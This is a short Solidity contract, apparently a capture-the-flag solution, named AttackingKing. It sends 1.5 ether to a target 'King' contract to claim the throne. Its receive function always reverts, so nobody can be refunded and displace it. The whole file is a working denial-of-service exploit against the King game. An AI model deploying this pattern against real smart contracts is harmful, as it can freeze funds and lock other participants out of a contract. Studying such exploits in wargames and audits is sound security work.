// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {

    address public king;

    // Impersonate king contract address
    // Constructor needs to be payable because King has a payable constructor
    constructor(address _king) payable {
        king = _king;
    }

    // first payable is to make hackContract payable 
    function hackContract() public payable{
        // payable defines king as a function that can receive $$
        // just make address payable
        payable(king).call{value: 1.5 ether}("");
    }
    
    receive() external payable{
        // Error messages cost a lot of gas, make them short
        require(1 == 0, "I'm King forever");
    }
}
